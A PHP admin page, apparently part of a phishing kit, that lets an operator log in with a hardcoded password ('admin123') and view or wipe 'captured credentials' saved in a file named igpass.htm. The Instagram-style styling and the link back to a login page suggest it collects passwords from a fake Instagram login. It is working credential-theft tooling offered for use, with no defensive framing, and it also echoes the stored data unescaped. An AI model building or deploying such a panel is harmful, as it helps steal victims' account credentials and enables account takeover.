<?php
// Simple password protection
$password = "admin123"; // Change this to a secure password

// Check if logged in
session_start();
$loggedIn = false;

if (isset($_POST['password']) && $_POST['password'] === $password) {
    $_SESSION['auth'] = true;
    $loggedIn = true;
} elseif (isset($_SESSION['auth']) && $_SESSION['auth'] === true) {
    $loggedIn = true;
}

// Clear data if requested
if ($loggedIn && isset($_GET['clear']) && $_GET['clear'] === '1') {
    // Clear all data but keep the HTML structure
    file_put_contents('igpass.htm', '<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Data</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 20px;
        }
        hr {
            border: 1px solid #eee;
            margin: 15px 0;
        }
    </style>
</head>
<body>
<!-- Captured credentials will be stored here -->
</body>
</html>');
    
    header('Location: view_data.php');
    exit;
}

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>View Data</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            margin: 20px;
            padding: 0;
            background-color: #f5f5f5;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #333;
            border-bottom: 1px solid #eee;
            padding-bottom: 10px;
        }
        .login-form {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
            background: #f9f9f9;
            border-radius: 5px;
        }
        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ddd;
            border-radius: 3px;
        }
        button {
            background: #0095f6;
            color: white;
            border: none;
            padding: 10px 15px;
            border-radius: 3px;
            cursor: pointer;
        }
        button:hover {
            background: #0056b3;
        }
        .alert {
            padding: 10px;
            background: #ffecec;
            color: #f44336;
            margin-bottom: 15px;
            border-radius: 3px;
        }
        .actions {
            margin-top: 20px;
            display: flex;
            justify-content: space-between;
        }
        .actions a {
            padding: 8px 15px;
            background: #f1f1f1;
            color: #333;
            text-decoration: none;
            border-radius: 3px;
        }
        .actions a.danger {
            background: #f44336;
            color: white;
        }
        .data-frame {
            margin-top: 20px;
            border: 1px solid #ddd;
            padding: 15px;
            background: white;
            max-height: 600px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>View Captured Data</h1>
        
        <?php if (!$loggedIn): ?>
            <?php if (isset($_POST['password'])): ?>
                <div class="alert">Incorrect password. Please try again.</div>
            <?php endif; ?>
            
            <div class="login-form">
                <form method="post">
                    <h2>Authentication Required</h2>
                    <p>Please enter the password to view data:</p>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Login</button>
                </form>
            </div>
        <?php else: ?>
            <div class="actions">
                <a href="index.php">Return to Login Page</a>
                <a href="view_data.php?clear=1" class="danger" onclick="return confirm('Are you sure you want to clear all data? This cannot be undone.')">Clear All Data</a>
            </div>
            
            <div class="data-frame">
                <h2>Captured Credentials</h2>
                
                <?php
                // Read and display the content of igpass.htm
                if (file_exists('igpass.htm')) {
                    // Read the file
                    $content = file_get_contents('igpass.htm');
                    
                    // Extract the body content (if it follows HTML structure)
                    $bodyStart = strpos($content, '<body>');
                    $bodyEnd = strpos($content, '</body>');
                    
                    if ($bodyStart !== false && $bodyEnd !== false) {
                        $bodyContent = substr($content, $bodyStart + 6, $bodyEnd - $bodyStart - 6);
                        echo $bodyContent;
                    } else {
                        // If not proper HTML, just output the whole file
                        echo $content;
                    }
                } else {
                    echo "<p>No data file found.</p>";
                }
                ?>
            </div>
        <?php endif; ?>
    </div>
</body>
</html> 